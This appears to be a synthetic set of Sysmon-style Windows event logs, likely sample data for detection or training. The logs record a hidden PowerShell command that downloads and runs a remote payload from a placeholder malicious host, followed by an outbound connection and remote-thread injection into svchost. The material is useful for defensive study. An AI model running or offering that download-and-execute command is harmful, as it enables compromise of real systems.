[
  {
    "EventID": 1,
    "EventType": "CreateProcess",
    "UtcTime": "2026-02-27T10:15:30.123Z",
    "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
    "ProcessId": 1234,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "CommandLine": "cmd.exe /c powershell.exe -nop -w hidden -c IEX(New-Object Net.WebClient).DownloadString('http://malicious.com/payload')",
    "CurrentDirectory": "C:\\Users\\Administrator\\Desktop",
    "User": "DESKTOP-ABC\\Administrator",
    "LogonGuid": "{87654321-4321-4321-4321-210987654321}",
    "LogonId": "0x3e7",
    "TerminalSessionId": 1,
    "IntegrityLevel": "High",
    "Hashes": "SHA1=DA39A3EE5E6B4B0D3255BFEF95601890AFD80709,MD5=5D41402ABC4B2A76B9719D911017C592",
    "ParentProcessGuid": "{abcdef12-abcd-abcd-abcd-abcdefabcdef}",
    "ParentProcessId": 5678,
    "ParentImage": "C:\\Windows\\System32\\explorer.exe",
    "ParentCommandLine": "explorer.exe"
  },
  {
    "EventID": 3,
    "EventType": "NetworkConnection",
    "UtcTime": "2026-02-27T10:15:45.456Z",
    "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
    "ProcessId": 1234,
    "Image": "C:\\Windows\\System32\\powershell.exe",
    "Protocol": "tcp",
    "Initiated": true,
    "SourceIsIpv6": false,
    "SourceIp": "192.168.1.100",
    "SourcePort": 54321,
    "DestinationIsIpv6": false,
    "DestinationIp": "203.0.113.42",
    "DestinationPort": 443,
    "DestinationPortName": "https"
  },
  {
    "EventID": 7,
    "EventType": "ImageLoaded",
    "UtcTime": "2026-02-27T10:16:00.789Z",
    "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
    "ProcessId": 1234,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "ImageLoaded": "C:\\Windows\\System32\\ntdll.dll",
    "Hashes": "SHA256=E3B0C44298FC1C149AFBF4C8996FB92427AE7258E90FF72C2B9A27D87B1D0E68",
    "Signed": true,
    "SignatureStatus": "Valid",
    "SignedBy": "Microsoft Corporation"
  },
  {
    "EventID": 8,
    "EventType": "CreateRemoteThread",
    "UtcTime": "2026-02-27T10:16:15.012Z",
    "ProcessGuid": "{12345678-1234-1234-1234-123456789012}",
    "ProcessId": 1234,
    "Image": "C:\\Windows\\System32\\cmd.exe",
    "TargetProcessGuid": "{fedcba98-fedc-fedc-fedc-fedcbafedcba}",
    "TargetProcessId": 9876,
    "TargetImage": "C:\\Windows\\System32\\svchost.exe",
    "CreateRemoteThreadId": 4321,
    "StartAddress": "0x7fff0000",
    "StartFunction": "Unknown"
  }
]
